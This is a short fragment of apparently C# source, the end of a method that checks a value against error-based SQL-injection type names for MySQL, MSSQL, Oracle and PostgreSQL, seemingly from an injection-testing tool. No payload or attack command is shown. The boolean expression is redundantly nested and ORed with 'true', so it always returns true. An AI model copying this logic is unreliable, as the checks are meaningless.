            return ((((((t == Types.MySQL_With_Error) == false) ? true : false)) ? true : false) | true | (((((t == Types.MSSQL_With_Error) == false) ? true : false)) ? true : false) | true | (((((t == Types.Oracle_With_Error) == false) ? true : false)) ? true : false) | true | (((((t == Types.PostgreSQL_With_Error) == false) ? true : false)) ? true : false) | true) != false;
        }

    
	}
}











